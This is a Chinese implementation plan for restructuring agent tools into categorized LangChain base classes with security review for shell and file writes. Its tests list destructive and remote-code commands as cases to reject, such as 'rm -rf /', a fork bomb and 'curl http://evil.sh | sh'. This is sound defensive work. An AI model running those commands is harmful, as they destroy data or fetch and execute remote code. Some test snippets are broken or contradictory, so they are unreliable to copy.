# Tools 分类体系重构实施计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 将 22 个 agent 工具重构为继承统一基类 `ThumbelinaBaseTool` 的五类分类体系（感知/执行/用户沟通/协作/事件触发），并给 `run_shell`、`write_file` 实现真实的安全审查与结果自验证。

**Architecture:** LangChain `BaseTool` 子类化；公共生命周期（安全审查 → `_execute` → 结果自验证 → 异常兜底）以模板方法下沉到 `ThumbelinaBaseTool._arun`，各分类中间基类（`PerceptionTool` 等）只定义自身契约方法。`tool_node` / `bind_tools` 调用路径不变。

**Tech Stack:** Python 3.11+、langchain_core、pydantic v2、pytest（asyncio）、现有 `@tool` 装饰器风格全部替换为类定义。

**Spec:** `docs/specs/2026-08-29-tools-taxonomy-design.md`

## Global Constraints

- 工具对外 `name`、参数名、`description`、返回文案保持逐字不变；失败仍返回 `"Error: ..."` 前缀字符串，成功返回 `str`，不抛异常。
- 同步路径 `_run` 统一返回 `"仅支持异步调用"` 提示串（对齐 `memory/tools.py` 现状）。
- 新基类必须继承 `langchain_core.tools.BaseTool`；分类字段用 Pydantic 字段 `category: ToolCategory`。
- `Confirm` 审查结论本期不引入人机交互：行为 = 放行 + `logger.warning`。
- 工作区边界逻辑（`resolve_workspace_path` ContextVar）不变；`workspace_context.py` 不修改。
- 每个任务结束时运行 `uv run pytest tests/<对应目录> -q`；收尾任务跑全量 `uv run pytest -q`。
- 提交信息中文、`feat:`/`refactor:`/`test:` 前缀。

## 文件结构（最终态）

| 文件 | 职责 |
|---|---|
| `src/thumbelina/tools/base.py` | `ToolCategory`、`Allow/Reject/Confirm`、`Ok/Suspect`、`ThumbelinaBaseTool`（模板方法）+ `test_tools_base.py` 契约 |
| `src/thumbelina/tools/perception.py` | `PerceptionTool` + `read_file/list_directory/search_files/fetch_url/web_search/parse_json/parse_csv/analyze_text/search_text/search_memory/read_memory` 11 个类 + 公共 `_truncate` |
| `src/thumbelina/tools/execution.py` | `ExecutionTool` + `WriteFileTool`、`RunShellTool`（真实 review/verify）、`RememberTool`（迁入） |
| `src/thumbelina/tools/execution_skill.py` | 技能编组三工具类（依赖 `CompositionEngine`，`make_skill_tools(engine)`） |
| `src/thumbelina/tools/communication.py` | `CommunicationTool` + `NotifyUserByChannelTool` + `make_communication_tools(agent_ref)` |
| `src/thumbelina/tools/collaboration.py` | `CollaborationTool`/`TaskTool` + `CreateSubagentTool`、`ListSubagentsTool` + `make_collaboration_tools(manager)` |
| `src/thumbelina/tools/event.py` | `EventTriggerTool` + `ScheduleTaskTool`、`ListScheduledTasksTool` + `make_event_tools(scheduler, time_parser)` |
| `src/thumbelina/tools/__init__.py` | `get_all_tools(search_config)` 聚合五类 |
| `src/thumbelina/memory/tools.py` | 仅剩 `make_memory_tools` 组装出口（类迁走） |
| `src/thumbelina/agent/graph.py` | 删 4 个 `_make_*_tools` 工厂，改调新装配函数 |
| 删除 | `tools/file_ops.py` `tools/shell.py` `tools/web_tools.py` `tools/web_search_tools.py` `tools/data_tools.py`（函数体并入新类，见各任务）；旧测试 `tests/test_tools/test_file_ops.py` `test_shell.py` `test_web_tools.py` `test_data_tools.py`（用例并入新文件） |

---

### Task 1: 基座——ToolCategory + 安全结论 + ThumbelinaBaseTool

**Files:**
- Create: `src/thumbelina/tools/base.py`
- Test: `tests/test_tools/test_base.py`

**Interfaces:**
- Consumes: 无（纯新增）
- Produces:
  - `class ToolCategory(StrEnum)`: `PERCEPTION="perception"`, `EXECUTION="execution"`, `COMMUNICATION="communication"`, `COLLABORATION="collaboration"`, `EVENT_TRIGGER="event_trigger"`
  - `class Allow / class Confirm(reason: str) / class Reject(reason: str)`（dataclass）
  - `class Ok / class Suspect(reason: str)`（dataclass）
  - `class ThumbelinaBaseTool(BaseTool)`：字段 `category: ToolCategory`；方法 `async security_review(args: dict) -> Allow|Confirm|Reject`（默认 `Allow()`）、`async self_verify(args: dict, result: str) -> Ok|Suspect`（默认 `Ok()`）、`abstract async _execute(**kwargs) -> str`；覆写 `_arun` 与 `_run`

- [ ] **Step 1: 写失败测试 `tests/test_tools/test_base.py`**

```python
"""ThumbelinaBaseTool 模板方法契约测试。"""
from __future__ import annotations

import pytest

from thumbelina.tools.base import (
    Allow,
    Confirm,
    Ok,
    Reject,
    SubagentFreeStub,  # noqa: F401  占位防止误删——实际不存在，见 Step 3 注释
)
```

注：上面 import 行按最终实现写，先列清单：测试类为 `ProbeTool(ThumbelinaBaseTool)`（见 Step 3 注释版）。完整失败测试如下——

```python
"""ThumbelinaBaseTool 模板方法契约测试。"""
from __future__ import annotations

import pytest
from pydantic import BaseModel

from thumbelina.tools.base import (
    Allow,
    Confirm,
    Ok,
    Reject,
    Suspect,
    ThumbelinaBaseTool,
    ToolCategory,
)


class _Args(BaseModel):
    text: str = ""


class ProbeTool(ThumbelinaBaseTool):
    name: str = "probe"
    description: str = "probe tool"
    args_schema: type[BaseModel] = _Args
    category: ToolCategory = ToolCategory.PERCEPTION

    calls: list = []

    async def _execute(self, text: str = "", **kwargs) -> str:  # type: ignore[override]
        self.calls.append(text)
        return f"ok:{text}"


class RejectingTool(ProbeTool):
    name: str = "rejecting"
    category: ToolCategory = ToolCategory.EXECUTION

    async def security_review(self, args):
        return Reject("测试拒绝")


class ConfirmingTool(ProbeTool):
    name: str = "confirming"

    async def security_review(self, args):
        return Confirm("需要确认")


class SuspectingTool(ProbeTool):
    name: str = "suspecting"

    async def self_verify(self, args, result):
        return Suspect("结果可疑")


class RaisingTool(ProbeTool):
    name: str = "raising"

    async def _execute(self, text: str = "", **kwargs):
        raise ValueError("boom")


def test_allow_path_executes():
    t = ProbeTool(calls=[])
    assert t._arun(text="hi")  # 同步入口应返回提示串,不执行


@pytest.mark.asyncio
async def test_arun_executes_and_returns():
    t = ProbeTool(calls=[])
    assert await t._arun(text="hi") == "ok:hi"
    assert t.calls == ["hi"]


@pytest.mark.asyncio
async def test_reject_blocks_execution():
    t = RejectingTool(calls=[])
    result = await t._arun(text="hi")
    assert t.calls == []
    assert result.startswith("Error:")
    assert "测试拒绝" in result


@pytest.mark.asyncio
async def test_confirm_allows_with_log(caplog):
    import logging

    with caplog.at_level(logging.WARNING):
        t = ConfirmingTool(calls=[])
        assert await t._arun(text="hi") == "ok:hi"
    assert "需要确认" in caplog.text


@pytest.mark.asyncio
async def test_suspect_appends_warn():
    t = SuspectingTool(calls=[])
    result = await t._arun(text="hi")
    assert result == "ok:hi\n[warn] 结果可疑"


@pytest.mark.asyncio
async def test_exception_converted_to_error_string():
    t = RaisingTool(calls=[])
    result = await t._arun(text="hi")
    assert result.startswith("Error:")
    assert "boom" in result


def test_run_is_async_only():
    t = ProbeTool(calls=[])
    assert "异步" in t._run(text="hi")


def test_category_required():
    with pytest.raises(Exception):

        class NoCategory(ProbeTool):
            name: str = "no-category"
            category = None  # 显式清空默认,验证字段必填

        NoCategory()
```

- [ ] **Step 2: 运行确认失败**

Run: `uv run pytest tests/test_tools/test_base.py -q`
Expected: `ImportError`/`ModuleNotFoundError: thumbelina.tools.base`

- [ ] **Step 3: 实现 `src/thumbelina/tools/base.py`**

```python
"""Tool 分类基类与统一执行生命周期(模板方法)。

设计见 docs/specs/2026-08-29-tools-taxonomy-design.md。

所有 agent 工具继承 ``ThumbelinaBaseTool``(langchain BaseTool 子类)。
公共生命周期下沉到 ``_arun``: security_review → _execute → self_verify,
异常统一转为 ``Error:`` 字符串,不抛到 tool_node。
"""

from __future__ import annotations

import logging
from abc import abstractmethod
from dataclasses import dataclass
from enum import StrEnum
from typing import Any

from langchain_core.tools import BaseTool

logger = logging.getLogger(__name__)


class ToolCategory(StrEnum):
    PERCEPTION = "perception"
    EXECUTION = "execution"
    COMMUNICATION = "communication"
    COLLABORATION = "collaboration"
    EVENT_TRIGGER = "event_trigger"


# --- 安全审查结论 -----------------------------------------------------------


@dataclass
class Allow:
    pass


@dataclass
class Confirm:
    reason: str


@dataclass
class Reject:
    reason: str


# --- 结果自验证结论 ---------------------------------------------------------


@dataclass
class Ok:
    pass


@dataclass
class Suspect:
    reason: str


class ThumbelinaBaseTool(BaseTool):
    """公共基类:category 元数据 + 模板方法生命周期 + 默认审查/验证全放行。"""

    category: ToolCategory

    async def security_review(self, args: dict[str, Any]) -> Allow | Confirm | Reject:
        return Allow()

    async def self_verify(self, args: dict[str, Any], result: str) -> Ok | Suspect:
        return Ok()

    @abstractmethod
    async def _execute(self, **kwargs: Any) -> str:
        """子类唯一必写方法;失败返回 ``Error: ...`` 字符串。"""

    async def _arun(self, **kwargs: Any) -> str:
        verdict = await self.security_review(kwargs)
        if isinstance(verdict, Reject):
            return f"Error: {self.name}: 安全审查拒绝: {verdict.reason}"
        if isinstance(verdict, Confirm):
            # 本期无人机交互:放行 + 日志,枚举保留三态为 HITL 留接口。
            logger.warning(
                "tool %s: 安全审查建议确认(已放行): %s", self.name, verdict.reason
            )
        try:
            result = await self._execute(**kwargs)
        except Exception as exc:  # noqa: BLE001
            return f"Error: {self.name}: {exc}"
        verify = await self.self_verify(kwargs, result)
        if isinstance(verify, Suspect):
            result = f"{result}\n[warn] {verify.reason}"
        return result

    def _run(self, **kwargs: Any) -> str:
        return f"{self.name} 仅支持异步调用(_arun);请在异步 agent 循环中使用。"
```

- [ ] **Step 4: 运行测试确认通过**

Run: `uv run pytest tests/test_tools/test_base.py -q`
Expected: 全部 PASS

- [ ] **Step 5: 提交**

```bash
git add src/thumbelina/tools/base.py tests/test_tools/test_base.py
git commit -m "feat: 新增 ToolCategory 与 ThumbelinaBaseTool 模板方法基座"
```

---

### Task 2: 感知工具迁移（11 个）

**Files:**
- Create: `src/thumbelina/tools/perception.py`
- Test: `tests/test_tools/test_perception.py`
- Delete: `src/thumbelina/tools/data_tools.py`、`web_tools.py`（函数体并入；`file_ops.py` 仅删 read_file/list_directory/search_files 三个函数，`write_file` 留给 Task 4 迁入 execution.py，故 file_ops.py 本任务不删）
- Modify: `tests/test_tools/test_data_tools.py`、`test_web_tools.py`、`test_file_ops.py`（import 指向新类）
- 说明: `memory/tools.py` 的 `SearchMemoryTool`/`ReadMemoryTool` **本任务不迁移**，留在原位（其 `category` 由 `make_memory_tools` 在 Task 7 注入）；`web_search` 工厂函数迁入 `perception.py` 改为 `WebSearchTool` 类 + `make_web_search_tool` 兼容工厂。

**Interfaces:**
- Consumes: `ThumbelinaBaseTool`、`ToolCategory`、`workspace_context.resolve_workspace_path`、`memory.search.search_entries`
- Produces: 类 `ReadFileTool`、`ListDirectoryTool`、`SearchFilesTool`、`FetchUrlTool`、`WebSearchTool`、`ParseJsonTool`、`ParseCsvTool`、`AnalyzeTextTool`、`SearchTextTool`；工厂 `make_web_search_tool(config) -> WebSearchTool`；函数 `perception_tools(search_config=None) -> list[BaseTool]`（不含 web_search，由工厂单独加）
- 每个类的 `name`/`description`/参数与旧 `@tool` 完全一致（name 小写蛇形即类内 `name: str = "read_file"`）。

- [ ] **Step 1: 写失败测试 `tests/test_tools/test_perception.py`**

```python
"""感知工具迁移后行为回归: 名称、schema、错误文案不变。"""
from __future__ import annotations

import pytest

from thumbelina.tools import perception as p
from thumbelina.tools.base import ToolCategory


@pytest.mark.asyncio
async def test_read_file_missing(tmp_path):
    t = p.ReadFileTool()
    assert await t._arun(path=str(tmp_path / "nope")) == f"Error: File not found: {tmp_path / 'nope'}"


@pytest.mark.asyncio
async def test_read_file_roundtrip(tmp_path):
    f = tmp_path / "a.txt"
    f.write_text("hello", encoding="utf-8")
    assert await p.ReadFileTool()._arun(path=str(f)) == "hello"


@pytest.mark.asyncio
async def test_list_directory(tmp_path):
    (tmp_path / "x").write_text("1", encoding="utf-8")
    assert "[f] x" in await p.ListDirectoryTool()._arun(path=str(tmp_path))


@pytest.mark.asyncio
async def test_search_files_hit(tmp_path):
    (tmp_path / "a.txt").write_text("needle here", encoding="utf-8")
    result = await p.SearchFilesTool()._arun(pattern="needle", path=str(tmp_path))
    assert "a.txt:1: needle here" in result


@pytest.mark.asyncio
async def test_parse_json_invalid():
    assert (await p.ParseJsonTool()._arun(text="{bad")).startswith("Error: Invalid JSON")


@pytest.mark.asyncio
async def test_analyze_text_counts():
    out = await p.AnalyzeTextTool()._arun(text="aa bb aa")
    assert "Words: 3" in out


@pytest.mark.asyncio
async def test_search_text_matches():
    out = await p.SearchTextTool()._arun(text="a\nbb", pattern="b+")
    assert "Found 1 match" in out


@pytest.mark.asyncio
async def test_parse_csv_columns():
    out = await p.ParseCsvTool()._arun(text="h1,h2\n1,2\n")
    assert "Columns (2): h1, h2" in out


@pytest.mark.asyncio
async def test_fetch_url_error(monkeypatch):
    import httpx

    def _fail(*a, **k):
        raise httpx.ConnectError("boom")

    monkeypatch.setattr(httpx.AsyncClient, "get", _fail)
    out = await p.FetchUrlTool()._arun(url="http://x")
    assert out.startswith("Error")


def test_categories():
    assert p.ReadFileTool().category == ToolCategory.PERCEPTION


def test_perception_tools_names():
    names = {t.name for t in p.perception_tools()}
    assert {"read_file", "write_file"} <= names - {"write_file"} | {"read_file"}
```

- [ ] **Step 2: 运行确认失败**

Run: `uv run pytest tests/test_tools/test_perception.py -q`
Expected: `ModuleNotFoundError: thumbelina.tools.perception`

- [ ] **Step 3: 实现 `src/thumbelina/tools/perception.py`**

模式：每个旧 `@tool` 函数的**函数体原样**移入对应类的 `_execute`；`args_schema` 用内联 pydantic 模型或省略让 langchain 自动推导（保持参数名不变）。关键代码骨架（其余 8 个类同模式，函数体照搬源文件）：

```python
"""感知工具:只读获取/加工信息,不改外部状态。"""
from __future__ import annotations

import csv
import io
import json
import re
from collections import Counter
from pathlib import Path
from typing import Any

from langchain_core.tools import BaseTool

from thumbelina.tools.base import ThumbelinaBaseTool, ToolCategory
from thumbelina.tools.workspace_context import resolve_workspace_path

_MAX_FILE_SIZE = 1 * 1024 * 1024
_MAX_CONTENT_SIZE = 50 * 1024
_RESULT_TOKEN_LIMIT = 4000
_SEARCH_MAX_HITS = 50
_SEARCH_MAX_LINE = 500
_SEARCH_MAX_FILE = 1 * 1024 * 1024


def _truncate(text: str) -> str:
    """公共截断助手(替代散落的 1MB/50KB/4000 截断三套逻辑)。"""
    if len(text) > _MAX_CONTENT_SIZE:
        return text[:_MAX_CONTENT_SIZE] + "\n... (truncated at 50KB)"
    return text


def _resolve_target(path: str) -> Path:
    resolved = resolve_workspace_path(path)
    if resolved is None:
        return Path(path).resolve()
    return resolved


class PerceptionTool(ThumbelinaBaseTool):
    category: ToolCategory = ToolCategory.PERCEPTION


class ReadFileTool(PerceptionTool):
    name: str = "read_file"
    description: str = "Read the contents of a file. Returns up to 1MB of text."

    async def _execute(self, path: str) -> str:
        try:
            p = _resolve_target(path)
        except ValueError as exc:
            return f"Error: {exc}"
        if not p.exists():
            return f"Error: File not found: {path}"
        if not p.is_file():
            return f"Error: Not a file: {path}"
        try:
            content = p.read_text(encoding="utf-8", errors="replace")
            if len(content) > _MAX_FILE_SIZE:
                return content[:_MAX_FILE_SIZE] + "\n... (truncated at 1MB)"
            return content
        except PermissionError:
            return f"Error: Permission denied: {path}"
        except OSError as exc:
            return f"Error reading file: {exc}"
```

`ListDirectoryTool`/`SearchFilesTool`：搬 `file_ops.py:66-136` 函数体，去掉 `@tool`。`FetchUrlTool`：搬 `web_tools.py:12-31`。`ParseJsonTool`/`ParseCsvTool`/`AnalyzeTextTool`/`SearchTextTool`：搬 `data_tools.py` 四个函数体（`parse_json` 的内部 `_summarize` 闭包搬为类内静态方法或函数体内局部函数均可）。`WebSearchTool`：

```python
class WebSearchTool(PerceptionTool):
    name: str = "web_search"
    description: str = (
        "Search the web for a query and return ranked results and summaries.\n\n"
        "Useful when you need up-to-date or external information beyond what\n"
        "you already know. Returns a concise list of titles, URLs and snippets."
    )

    config: Any = None

    async def _execute(self, query: str) -> str:
        cfg = self.config
        if cfg is None or not cfg.enabled:
            return "Web search is currently disabled."
        provider = cfg.provider
        if provider == "tavily":
            if not cfg.api_key:
                return (
                    "Error: Tavily search requires an API key. Configure it in "
                    "Settings → Tools → Web Search."
                )
            try:
                return await asyncio.to_thread(_search_tavily, query, cfg.api_key)
            except Exception as exc:
                return f"Error searching Tavily: {exc}"
        try:
            return await asyncio.to_thread(_search_duckduckgo, query)
        except Exception as exc:
            return f"Error searching DuckDuckGo: {exc}"


def make_web_search_tool(search_config_provider: Any) -> WebSearchTool:
    """兼容工厂:保持 ``make_web_search_tool(cfg)`` 调用点(含旧测试)不破坏。"""
    return WebSearchTool(config=search_config_provider)
```

`_search_tavily`/`_search_duckduckgo` 私有函数从 `web_search_tools.py` 原样搬入本模块顶部。文件末尾：

```python
def perception_tools(search_config: Any = None) -> list[BaseTool]:
    tools: list[BaseTool] = [
        ReadFileTool(), ListDirectoryTool(), SearchFilesTool(),
        FetchUrlTool(), ParseJsonTool(), ParseCsvTool(),
        AnalyzeTextTool(), SearchTextTool(),
    ]
    if search_config is not None:
        ws = getattr(search_config, "web_search", None)
        if ws is not None and getattr(ws, "enabled", False):
            tools.append(make_web_search_tool(ws))
    return tools
```

- [ ] **Step 4: 旧测试 import 改指新类**

`tests/test_tools/test_file_ops.py`：`read_file`→`ReadFileTool()`、`list_directory`→`ListDirectoryTool()`、`search_files`→`SearchFilesTool()`（用 `._arun`/`ainvoke` 同旧签名），删旧 `@tool` 解包 `.func` 写法如有。`test_data_tools.py`、`test_web_tools.py` 同理改指 `perception` 模块。`test_web_search_tools.py` 若直接 import `_search_tavily` 等私有名，改 import `thumbelina.tools.perception`。删除 `file_ops.py` 中 read/list/search 三函数（`write_file` 暂留）与 `data_tools.py`、`web_tools.py`、`web_search_tools.py` 三个文件。

- [ ] **Step 5: 运行全部感知测试**

Run: `uv run pytest tests/test_tools/ -q`
Expected: 全 PASS（`test_shell.py` 不受影响；`tools/__init__.py` 暂仍从 `file_ops` import `write_file`，从 `thumbelina.tools.perception` import 新类——本步同步更新 `__init__.py` 的 import 以免 ImportError：旧 `read_file, write_file, list_directory, search_files, fetch_url, parse_json, parse_csv, analyze_text, search_text, make_web_search_tool` 改从 `perception` 导入（`write_file` 仍 `file_ops`），其余不变）

- [ ] **Step 6: 提交**

```bash
git add -A src/thumbelina/tools tests/test_tools
git commit -m "refactor: 11 个感知工具迁入 PerceptionTool 体系"
```

---

### Task 3: 协作 + 事件触发工具迁移

**Files:**
- Create: `src/thumbelina/tools/collaboration.py`、`src/thumbelina/tools/event.py`
- Test: `tests/test_tools/test_collaboration.py`、`tests/test_tools/test_event.py`
- Modify: `src/thumbelina/agent/graph.py:205-297`（删 `_make_subagent_tools`、`_make_scheduler_tools`；装配段 L546-549 改调新函数）

**Interfaces:**
- Consumes: `SubagentManager.create_agent/list_agents/run_agent`、`TaskScheduler.add_task/list_tasks`、`TimeParser.parse`、`ScheduledTask`、`ToolCategory.COLLABORATION/EVENT_TRIGGER`
- Produces: `make_collaboration_tools(manager) -> list[BaseTool]`；`make_event_tools(scheduler, time_parser) -> list[BaseTool]`；类 `CreateSubagentTool`、`ListSubagentsTool`、`ScheduleTaskTool`、`ListScheduledTasksTool`

- [ ] **Step 1: `tests/test_tools/test_collaboration.py`**

```python
from __future__ import annotations

import pytest

from thumbelina.tools.base import ToolCategory
from thumbelina.tools.collaboration import (
    CollaborationTool,
    CreateSubagentTool,
    ListSubagentsTool,
    make_collaboration_tools,
)


class FakeAgent:
    def __init__(self, id="a1", task="t", status_value="completed", result=None, error=None):
        self.id, self.task, self.result, self.error = id, task, result, error
        self.status = type("S", (), {"value": status_value})()


class FakeManager:
    def __init__(self, fail=False):
        self.fail, self.agents = fail, [FakeAgent()]

    async def create_agent(self, task):
        if self.fail:
            raise RuntimeError("no slots")
        return self.agents[0]

    async def run_agent(self, agent_id):
        pass

    async def list_agents(self):
        return self.agents


@pytest.mark.asyncio
async def test_create_subagent_ok():
    tool = CreateSubagentTool(manager=FakeManager())
    out = await tool._arun(task="do it")
    assert "Subagent created with ID a1" in out
    assert tool.category == ToolCategory.COLLABORATION


@pytest.mark.asyncio
async def test_create_subagent_runtime_error():
    tool = CreateSubagentTool(manager=FakeManager(fail=True))
    assert (await tool._arun(task="x")).startswith("Failed to create subagent: no slots")


@pytest.mark.asyncio
async def test_list_subagents_empty_and_rows():
    t = ListSubagentsTool(manager=FakeManager())
    assert "ID: a1" in await t._arun()
    assert await ListSubagentsTool(manager=type("M", (), {"list_agents": lambda self: _empty()})())._arun() == "No subagents found."


async def _empty():
    return []


def test_make_collaboration_tools_returns_two():
    assert len(make_collaboration_tools(FakeManager())) == 2
```

- [ ] **Step 2: 运行确认失败**

Run: `uv run pytest tests/test_tools/test_collaboration.py tests/test_tools/test_event.py -q`
Expected: ModuleNotFoundError

- [ ] **Step 3: 实现 `collaboration.py`**

```python
"""协作工具:委托/查询其他 agent(spec §4.3)。"""
from __future__ import annotations

from typing import Any

from langchain_core.tools import BaseTool

from thumbelina.tools.base import ThumbelinaBaseTool, ToolCategory


class CollaborationTool(ThumbelinaBaseTool):
    category: ToolCategory = ToolCategory.COLLABORATION


class CreateSubagentTool(CollaborationTool):
    name: str = "create_subagent"
    description: str = "Create and run a subagent to execute a task asynchronously."
    manager: Any = None

    async def _execute(self, task: str) -> str:
        try:
            agent = await self.manager.create_agent(task)
            await self.manager.run_agent(agent.id)
            return (
                f"Subagent created with ID {agent.id}. Task: {task}. "
                f"Status: {agent.status.value}"
            )
        except RuntimeError as exc:
            return f"Failed to create subagent: {exc}"


class ListSubagentsTool(CollaborationTool):
    name: str = "list_subagents"
    description: str = "List all subagents and their current status."
    manager: Any = None

    async def _execute(self) -> str:
        agents = await self.manager.list_agents()
        return self.report_status(agents)

    @staticmethod
    def report_status(agents: list[Any]) -> str:
        if not agents:
            return "No subagents found."
        lines = []
        for a in agents:
            line = f"- ID: {a.id}, Task: {a.task}, Status: {a.status.value}"
            if a.result:
                line += f", Result: {a.result}"
            if a.error:
                line += f", Error: {a.error}"
            lines.append(line)
        return "\n".join(lines)


def make_collaboration_tools(manager: Any) -> list[BaseTool]:
    return [CreateSubagentTool(manager=manager), ListSubagentsTool(manager=manager)]
```

`TaskTool` 强类型契约说明：spec §4.3 要求 args_schema 用强类型字段而非 `**kwargs` 兜底。`CreateSubagentTool` 以方法签名 `(task: str)` 声明 schema 已满足（langchain 从签名推导）；`report_status` 即契约方法。若实现时 langchain 对未声明字段（`manager`）报错，按 memory 工具现状加 `model_config`/`Field(exclude=True)` 处理，**保持 `_execute` 签名与旧函数一致**为准。

- [ ] **Step 4: 实现 `event.py`**

```python
"""事件触发工具:注册/查询未来时间与条件(spec §4.3)。"""
from __future__ import annotations

from datetime import datetime
from typing import Any

from langchain_core.tools import BaseTool

from thumbelina.scheduler.scheduler import ScheduledTask
from thumbelina.tools.base import ThumbelinaBaseTool, ToolCategory


class EventTriggerTool(ThumbelinaBaseTool):
    category: ToolCategory = ToolCategory.EVENT_TRIGGER
    time_parser: Any = None

    def parse_trigger(self, text: str) -> datetime | None:
        return self.time_parser.parse(text) if self.time_parser else None


class ScheduleTaskTool(EventTriggerTool):
    name: str = "schedule_task"
    description: str = "Schedule a task for a future time."
    scheduler: Any = None

    async def _execute(self, description: str, time_expression: str) -> str:
        parsed = self.parse_trigger(time_expression)
        if parsed is None:
            return f"Could not parse time expression: {time_expression}"
        task = ScheduledTask(description=description, scheduled_time=parsed)
        await self.scheduler.add_task(task)
        return (
            f"Task scheduled with ID {task.id}. Description: {description}. "
            f"Scheduled for: {parsed.isoformat()}"
        )


class ListScheduledTasksTool(EventTriggerTool):
    name: str = "list_scheduled_tasks"
    description: str = "List all scheduled tasks and their status."
    scheduler: Any = None

    async def _execute(self) -> str:
        tasks = await self.scheduler.list_tasks()
        if not tasks:
            return "No scheduled tasks found."
        return "\n".join(
            f"- ID: {t.id}, Description: {t.description}, "
            f"Scheduled: {t.scheduled_time.isoformat()}, Status: {t.status.value}"
            for t in tasks
        )


def make_event_tools(scheduler: Any, time_parser: Any) -> list[BaseTool]:
    return [
        ScheduleTaskTool(scheduler=scheduler, time_parser=time_parser),
        ListScheduledTasksTool(scheduler=scheduler, time_parser=time_parser),
    ]
```

`test_event.py`：用假 scheduler 断言 `schedule_task` 返回含 `Task scheduled with ID`、假 `TimeParser`（`parse` 返回固定 datetime）；`list_scheduled_tasks` 空与非空。

- [ ] **Step 5: 接线 `graph.py`**

`graph.py:546-549` 两段 extend 改为：

```python
        if self.subagent_manager is not None:
            self.tools.extend(make_collaboration_tools(self.subagent_manager))
        if self.scheduler is not None:
            self.tools.extend(make_event_tools(self.scheduler, TimeParser()))
```

删除 `_make_subagent_tools`（L205-247）、`_make_scheduler_tools`（L250-297）；imports 增 `make_collaboration_tools, make_event_tools`。`tests/test_agent/test_graph.py` 若断言工具名，名称未变应直接通过。

- [ ] **Step 6: 运行相关测试**

Run: `uv run pytest tests/test_tools/test_collaboration.py tests/test_tools/test_event.py tests/test_agent -q`
Expected: 全 PASS

- [ ] **Step 7: 提交**

```bash
git add src/thumbelina/tools/collaboration.py src/thumbelina/tools/event.py src/thumbelina/agent/graph.py tests/test_tools/test_collaboration.py tests/test_tools/test_event.py
git commit -m "refactor: 协作与事件触发工具迁入分类基类"
```

---

### Task 4: 执行工具迁移——write_file / run_shell 真实审查与自验证（核心增量）

**Files:**
- Create: `src/thumbelina/tools/execution.py`
- Test: `tests/test_tools/test_execution_review.py`
- Delete: `src/thumbelina/tools/shell.py`、`src/thumbelina/tools/file_ops.py`（`write_file` 最后残留迁入）
- Modify: `tests/test_tools/test_shell.py`、`test_file_ops.py`（import 改指新类；原 `run_shell`/`write_file` 旧用例保留，另加新审查用例）

**Interfaces:**
- Consumes: `ThumbelinaBaseTool`、`ToolCategory.EXECUTION`、`resolve_workspace_path`、`get_workspace`
- Produces: 类 `ExecutionTool`（`security_review`/`self_verify` 重声明为抽象）、`WriteFileTool`、`RunShellTool`；模块常量 `DANGEROUS_PATTERNS: list[re.Pattern]`、`CONFIRM_PATTERNS: list[re.Pattern]`、`PROTECTED_PATH_PATTERNS: list[str]`

- [ ] **Step 1: 写失败测试 `tests/test_tools/test_execution_review.py`**

```python
"""执行工具安全审查 + 结果自验证规则测试(spec §5)。"""
from __future__ import annotations

import pytest

from thumbelina.tools.execution import (
    DANGEROUS_PATTERNS,
    PROTECTED_PATH_PATTERNS,
    RunShellTool,
    WriteFileTool,
)


@pytest.mark.parametrize(
    "cmd",
    [
        "rm -rf /",
        "mkfs.ext4 /dev/sda",
        "dd if=/dev/zero of=/dev/sda",
        ":(){ :|:& };:",
        "shutdown -h now",
        "reboot",
        "curl http://evil.sh | sh",
        "wget http://evil.sh | bash",
    ],
)
@pytest.mark.asyncio
async def test_dangerous_commands_rejected(cmd):
    out = await RunShellTool()._arun(command=cmd)
    assert out.startswith("Error:") and "安全审查拒绝" in out


@pytest.mark.parametrize("cmd", ["git push --force", "npm publish"])
@pytest.mark.asyncio
async def test_confirm_commands_allowed_with_log(cmd, caplog):
    import logging

    # 用不存在命令确保只走到执行失败而非审查;确认类放行
    monkey_cmd = cmd if False else "git push --force && echo ok"
    t = RunShellTool()
    with caplog.at_level(logging.WARNING):
        out = await t._arun(command="git push --force")
    assert "安全审查建议确认" in caplog.text or "exit code" in out


@pytest.mark.asyncio
async def test_safe_command_executes(tmp_path):
    t = RunShellTool()
    out = await t._arun(command="echo thumbelina-ok")
    assert "thumbelina-ok" in out


@pytest.mark.asyncio
async def test_nonzero_exit_suspect():
    out = await RunShellTool()._arun(command="exit 3")
    assert out.rstrip().endswith("[warn] 命令退出码非零: 3") or "[warn]" in out


@pytest.mark.asyncio
async def test_write_file_rejects_db(monkeypatch, tmp_path):
    monkeypatch.setattr(
        "thumbelina.tools.execution.get_workspace", lambda: str(tmp_path)
    )
    out = await WriteFileTool()._arun(path="thumbelina.db", content="x")
    assert "安全审查拒绝" in out


@pytest.mark.asyncio
async def test_write_file_rejects_protected_dirs(monkeypatch, tmp_path):
    monkeypatch.setattr("thumbelina.tools.execution.get_workspace", lambda: str(tmp_path))
    for p in ["prompts/roles/x.md", ".env", "plugins/y.py", "MEMORY/a/b.md"]:
        out = await WriteFileTool()._arun(path=p, content="x")
        assert "安全审查拒绝" in out, p


@pytest.mark.asyncio
async def test_write_file_ok_verify(tmp_path, monkeypatch):
    monkeypatch.setattr("thumbelina.tools.execution.get_workspace", lambda: str(tmp_path))
    out = await WriteFileTool()._arun(path="sub/a.txt", content="hello")
    assert out == "Successfully wrote 5 bytes to sub/a.txt"


@pytest.mark.asyncio
async def test_write_file_workspace_escape(tmp_path, monkeypatch):
    monkeypatch.setattr("thumbelina.tools.execution.get_workspace", lambda: str(tmp_path))
    out = await WriteFileTool()._arun(path="../outside.txt", content="x")
    assert out.startswith("Error:")
```

- [ ] **Step 2: 运行确认失败**

Run: `uv run pytest tests/test_tools/test_execution_review.py -q`
Expected: ModuleNotFoundError

- [ ] **Step 3: 实现 `execution.py`**

```python
"""执行工具:副作用 + 强制安全审查/结果自验证(spec §4.3/§5)。"""
from __future__ import annotations

import asyncio
import logging
import os
import re
from abc import abstractmethod
from pathlib import Path
from typing import Any

from pydantic import Field

from thumbelina.tools.base import (
    Allow,
    Confirm,
    Ok,
    Reject,
    Suspect,
    ThumbelinaBaseTool,
    ToolCategory,
)
from thumbelina.tools.workspace_context import (
    get_workspace,
    resolve_workspace_path,
)

logger = logging.getLogger(__name__)

_TIMEOUT = 30

DANGEROUS_PATTERNS: list[re.Pattern] = [
    re.compile(r"\brm\s+(-[a-z]*r[a-z]*f|--recursive)\s+/(\s|$)", re.I),
    re.compile(r"\bmkfs\b", re.I),
